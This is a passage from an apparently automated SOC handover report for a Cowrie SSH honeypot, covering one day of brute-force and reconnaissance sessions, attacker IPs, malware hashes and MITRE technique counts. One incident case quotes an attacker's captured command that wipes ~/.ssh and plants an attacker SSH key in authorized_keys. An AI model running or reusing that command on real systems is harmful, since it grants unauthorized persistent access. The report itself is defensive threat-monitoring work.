| `2026-03-20 15:23:51` | `cowrie.command.failed` |
| `2026-03-20 15:23:51` | `cowrie.log.closed` |
| `2026-03-20 15:23:51` | `cowrie.session.params` |
| `2026-03-20 15:23:51` | `cowrie.command.input` |
| `2026-03-20 15:23:51` | `cowrie.session.file_download` |
| `2026-03-20 15:23:51` | `cowrie.log.closed` |
| `2026-03-20 15:23:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02dafa677a36

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-20 15:23 |
| **Last Seen** | 2026-03-20 15:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:23:52` | `cowrie.session.connect` |
| `2026-03-20 15:23:52` | `cowrie.client.version` |
| `2026-03-20 15:23:52` | `cowrie.client.kex` |
| `2026-03-20 15:23:52` | `cowrie.login.success` |
| `2026-03-20 15:23:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f8c0b9d5d1

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-20 15:25 |
| **Last Seen** | 2026-03-20 15:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:25:42` | `cowrie.session.connect` |
| `2026-03-20 15:25:42` | `cowrie.client.version` |
| `2026-03-20 15:25:42` | `cowrie.client.kex` |
| `2026-03-20 15:25:43` | `cowrie.login.success` |
| `2026-03-20 15:25:43` | `cowrie.session.params` |
| `2026-03-20 15:25:43` | `cowrie.command.input` |
| `2026-03-20 15:25:43` | `cowrie.command.failed` |
| `2026-03-20 15:25:43` | `cowrie.log.closed` |
| `2026-03-20 15:25:43` | `cowrie.session.params` |
| `2026-03-20 15:25:43` | `cowrie.command.input` |
| `2026-03-20 15:25:43` | `cowrie.session.file_download` |
| `2026-03-20 15:25:43` | `cowrie.log.closed` |
| `2026-03-20 15:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26c94edb4e0e

| Field | Detail |
|---|---|
| **Source IP** | `120.62.8[.]17` |
| **First Seen** | 2026-03-20 15:25 |
| **Last Seen** | 2026-03-20 15:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:25:44` | `cowrie.session.connect` |
| `2026-03-20 15:25:44` | `cowrie.client.version` |
| `2026-03-20 15:25:44` | `cowrie.client.kex` |
| `2026-03-20 15:25:44` | `cowrie.login.success` |
| `2026-03-20 15:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.62.8[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.62.8[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28ec3ac2ce54

| Field | Detail |
|---|---|
| **Source IP** | `106.75.177[.]183` |
| **First Seen** | 2026-03-20 15:44 |
| **Last Seen** | 2026-03-20 15:49 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-20 15:44:07` | `cowrie.session.connect` |
| `2026-03-20 15:44:08` | `cowrie.client.version` |
| `2026-03-20 15:44:08` | `cowrie.client.kex` |
| `2026-03-20 15:44:09` | `cowrie.login.success` |
| `2026-03-20 15:49:09` | `cowrie.session.file_upload` |
| `2026-03-20 15:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.177[.]183` to AbuseIPDB if not already reported
- [ ] Block `106.75.177[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.73[.]238` | **25** | 2026-03-20 09:57 | 2026-03-20 10:03 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.55[.]25` | **17** | 2026-03-20 03:25 | 2026-03-20 03:53 | 28m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.106[.]113` | **15** | 2026-03-20 10:25 | 2026-03-20 10:53 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.109[.]176` | **15** | 2026-03-20 09:28 | 2026-03-20 09:57 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.232.212[.]207` | **15** | 2026-03-20 00:28 | 2026-03-20 00:38 | 26m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.24[.]74` | **10** | 2026-03-20 09:39 | 2026-03-20 09:58 | 9m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.66[.]30` | **10** | 2026-03-20 06:57 | 2026-03-20 07:04 | 12m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.168.135[.]187` | **10** | 2026-03-20 12:04 | 2026-03-20 12:16 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.62.8[.]17` | **10** | 2026-03-20 15:18 | 2026-03-20 15:28 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.173.117[.]246` | **10** | 2026-03-20 09:03 | 2026-03-20 09:23 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `181.234.31[.]78` | **10** | 2026-03-20 11:59 | 2026-03-20 12:20 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.211.55[.]20` | **10** | 2026-03-20 12:38 | 2026-03-20 13:02 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.189.191[.]70` | **10** | 2026-03-20 04:45 | 2026-03-20 05:12 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.55[.]25` | **9** | 2026-03-20 09:00 | 2026-03-20 09:21 | 13m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.170[.]111` | **9** | 2026-03-20 01:45 | 2026-03-20 01:56 | 10m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `3.132.26[.]232` | **6** | 2026-03-20 02:30 | 2026-03-20 02:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.190.152[.]179` | **3** | 2026-03-20 14:48 | 2026-03-20 14:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `171.61.22[.]184` | **2** | 2026-03-20 06:05 | 2026-03-20 06:09 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `186.72.123[.]54` | **2** | 2026-03-20 12:55 | 2026-03-20 12:55 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.119.72[.]191` | **2** | 2026-03-20 02:38 | 2026-03-20 02:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.76.58[.]53` | **2** | 2026-03-20 10:03 | 2026-03-20 10:03 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.99.212[.]219` | **2** | 2026-03-20 00:18 | 2026-03-20 00:20 | 2m | 0 | `T1592` | 🟢 LOW |
| `47.90.139[.]56` | **2** | 2026-03-20 00:00 | 2026-03-20 00:01 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `8.130.142[.]241` | **2** | 2026-03-20 12:57 | 2026-03-20 12:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.88.137[.]80` | 1 | 2026-03-20 15:17 | 2026-03-20 15:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.3.43[.]242` | 1 | 2026-03-20 01:01 | 2026-03-20 01:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.63.228[.]72` | 1 | 2026-03-20 04:34 | 2026-03-20 04:34 | 17s | 0 | `T1592` | 🟢 LOW |
| `106.13.64[.]124` | 1 | 2026-03-20 04:55 | 2026-03-20 04:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.85[.]199` | 1 | 2026-03-20 09:24 | 2026-03-20 09:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.75.177[.]183` | 1 | 2026-03-20 15:42 | 2026-03-20 15:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.53.23[.]141` | 1 | 2026-03-20 00:25 | 2026-03-20 00:25 | 31s | 0 | `T1592` | 🟢 LOW |
| `111.70.11[.]38` | 1 | 2026-03-20 18:43 | 2026-03-20 18:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.21[.]178` | 1 | 2026-03-20 13:35 | 2026-03-20 13:36 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.42[.]37` | 1 | 2026-03-20 01:10 | 2026-03-20 01:10 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.120.49[.]14` | 1 | 2026-03-20 13:40 | 2026-03-20 13:40 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.194.142[.]167` | 1 | 2026-03-20 10:44 | 2026-03-20 10:44 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.30.127[.]9` | 1 | 2026-03-20 12:11 | 2026-03-20 12:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.72.182[.]88` | 1 | 2026-03-20 11:33 | 2026-03-20 11:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `112.92.167[.]50` | 1 | 2026-03-20 03:26 | 2026-03-20 03:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.244.235[.]242` | 1 | 2026-03-20 17:44 | 2026-03-20 17:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.48.138[.]69` | 1 | 2026-03-20 16:58 | 2026-03-20 16:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.163.178[.]146` | 1 | 2026-03-20 13:01 | 2026-03-20 13:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.186.208[.]20` | 1 | 2026-03-20 01:44 | 2026-03-20 01:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.26.153[.]84` | 1 | 2026-03-20 06:41 | 2026-03-20 06:41 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.194.50[.]39` | 1 | 2026-03-20 06:32 | 2026-03-20 06:32 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.1[.]74` | 1 | 2026-03-20 14:58 | 2026-03-20 15:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.106[.]205` | 1 | 2026-03-20 01:47 | 2026-03-20 01:48 | 78s | 0 | `T1592` | 🟢 LOW |
| `121.31.210[.]125` | 1 | 2026-03-20 15:16 | 2026-03-20 15:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.116.145[.]26` | 1 | 2026-03-20 13:50 | 2026-03-20 13:50 | 14s | 0 | `T1592` | 🟢 LOW |
| `123.118.108[.]206` | 1 | 2026-03-20 11:36 | 2026-03-20 11:36 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.131.219[.]226` | 1 | 2026-03-20 18:33 | 2026-03-20 18:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `123.164.193[.]186` | 1 | 2026-03-20 08:46 | 2026-03-20 08:46 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.19.183[.]202` | 1 | 2026-03-20 10:24 | 2026-03-20 10:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.35.109[.]214` | 1 | 2026-03-20 07:45 | 2026-03-20 07:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `128.185.220[.]90` | 1 | 2026-03-20 05:52 | 2026-03-20 05:52 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.235[.]36` | 1 | 2026-03-20 00:55 | 2026-03-20 00:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `154.74.145[.]98` | 1 | 2026-03-20 09:11 | 2026-03-20 09:13 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.115.121[.]116` | 1 | 2026-03-20 05:17 | 2026-03-20 05:18 | 31s | 0 | `T1592` | 🟢 LOW |
| `178.115.251[.]37` | 1 | 2026-03-20 16:14 | 2026-03-20 16:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.194[.]123` | 1 | 2026-03-20 01:56 | 2026-03-20 01:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.178.194[.]123` | 1 | 2026-03-20 09:54 | 2026-03-20 09:54 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.181.133[.]153` | 1 | 2026-03-20 00:30 | 2026-03-20 00:30 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.184.85[.]167` | 1 | 2026-03-20 12:41 | 2026-03-20 12:41 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.189.85[.]66` | 1 | 2026-03-20 00:21 | 2026-03-20 00:21 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.100.217[.]164` | 1 | 2026-03-20 15:17 | 2026-03-20 15:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.167.207[.]234` | 1 | 2026-03-20 04:54 | 2026-03-20 04:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.145[.]55` | 1 | 2026-03-20 03:08 | 2026-03-20 03:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.4[.]155` | 1 | 2026-03-20 11:04 | 2026-03-20 11:04 | 2s | 0 | `T1592` | 🟢 LOW |
| `183.196.144[.]45` | 1 | 2026-03-20 10:14 | 2026-03-20 10:14 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.56.216[.]153` | 1 | 2026-03-20 01:50 | 2026-03-20 01:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.82.108[.]109` | 1 | 2026-03-20 17:17 | 2026-03-20 17:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.117.251[.]40` | 1 | 2026-03-20 15:37 | 2026-03-20 15:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `186.235.193[.]170` | 1 | 2026-03-20 17:23 | 2026-03-20 17:23 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.56.162[.]181` | 1 | 2026-03-20 01:36 | 2026-03-20 01:36 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.90.79[.]26` | 1 | 2026-03-20 04:52 | 2026-03-20 04:53 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]98` | 1 | 2026-03-20 03:37 | 2026-03-20 03:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `196.188.187[.]205` | 1 | 2026-03-20 01:39 | 2026-03-20 01:39 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.55.85[.]196` | 1 | 2026-03-20 02:16 | 2026-03-20 02:16 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.123.169[.]104` | 1 | 2026-03-20 00:41 | 2026-03-20 00:41 | 12s | 0 | `T1592` | 🟢 LOW |
| `223.171.89[.]199` | 1 | 2026-03-20 11:51 | 2026-03-20 11:51 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.114[.]126` | 1 | 2026-03-20 01:59 | 2026-03-20 01:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.98[.]26` | 1 | 2026-03-20 04:05 | 2026-03-20 04:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.92.180[.]146` | 1 | 2026-03-20 12:57 | 2026-03-20 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `41.59.105[.]205` | 1 | 2026-03-20 11:49 | 2026-03-20 11:49 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.14.84[.]16` | 1 | 2026-03-20 12:50 | 2026-03-20 12:51 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.77.69[.]201` | 1 | 2026-03-20 00:56 | 2026-03-20 00:56 | 7s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.251.19[.]226` | 1 | 2026-03-20 00:00 | 2026-03-20 00:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.153[.]52` | 1 | 2026-03-20 06:11 | 2026-03-20 06:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.154[.]160` | 1 | 2026-03-20 05:13 | 2026-03-20 05:13 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.76.51[.]75` | 1 | 2026-03-20 10:34 | 2026-03-20 10:34 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.214.235[.]90` | 1 | 2026-03-20 02:11 | 2026-03-20 02:11 | 13s | 0 | `T1592` | 🟢 LOW |
| `58.23.78[.]50` | 1 | 2026-03-20 03:08 | 2026-03-20 03:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.110.7[.]69` | 1 | 2026-03-20 13:48 | 2026-03-20 13:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.126.224[.]134` | 1 | 2026-03-20 15:15 | 2026-03-20 15:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.93.36[.]136` | 1 | 2026-03-20 07:12 | 2026-03-20 07:12 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.167.19[.]189` | 1 | 2026-03-20 15:19 | 2026-03-20 15:19 | 1s | 0 | `T1592` | 🟢 LOW |
| `61.145.181[.]7` | 1 | 2026-03-20 12:08 | 2026-03-20 12:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.77.220[.]62` | 1 | 2026-03-20 14:35 | 2026-03-20 14:35 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.135[.]32` | 1 | 2026-03-20 17:25 | 2026-03-20 17:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.204[.]179` | 1 | 2026-03-20 15:47 | 2026-03-20 15:47 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.237[.]109` | 1 | 2026-03-20 17:14 | 2026-03-20 17:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `74.209.100[.]246` | 1 | 2026-03-20 17:53 | 2026-03-20 17:54 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.189.152[.]114` | 1 | 2026-03-20 02:04 | 2026-03-20 02:05 | 13s | 0 | `T1592` | 🟢 LOW |
| `91.145.252[.]2` | 1 | 2026-03-20 17:57 | 2026-03-20 17:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]222` | 1 | 2026-03-20 10:07 | 2026-03-20 10:07 | 0s | 3 | `T1110.001` | 🟢 LOW |
| `95.31.209[.]102` | 1 | 2026-03-20 06:23 | 2026-03-20 06:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **26/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.72.182[.]88` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 0 |
| `183.171.4[.]155` | MY | Celcom Axiata Berhad | **100** ⚠️ | 14 |
| `123.164.193[.]186` | CN | CHINANET HEILONGJIANG PROVINCE NETWORK | **100** ⚠️ | 12 |
| `112.194.142[.]167` | CN | China Unicom Sichuan province network | **100** ⚠️ | 50 |
| `111.70.21[.]178` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 50 |
| `118.26.153[.]84` | HK | China Unicom (Hong Kong) Operations Limited | **100** ⚠️ | 19 |
| `154.74.145[.]98` | TZ | MIC TANZANIA LTD PLC | **100** ⚠️ | 14 |
| `180.100.217[.]164` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `2.55.85[.]196` | IL | Partner Communications Ltd. | **100** ⚠️ | 25 |
| `58.23.78[.]50` | CN | Quanzhou city, fujian provincial network of CNCGROUP | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 324 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 212 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 43 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |

---

## 🔕 False Positive Summary (251 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 156 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 87 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 572 cases |
| Tool 34  | Credential Extractor        | ✅ 262 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 212 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 251 filtered (43.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 98 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 31 priority case(s) shown individually · 106 recon entry/entries in table (24 group(s) consolidating 208 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-20T18:45:14Z_
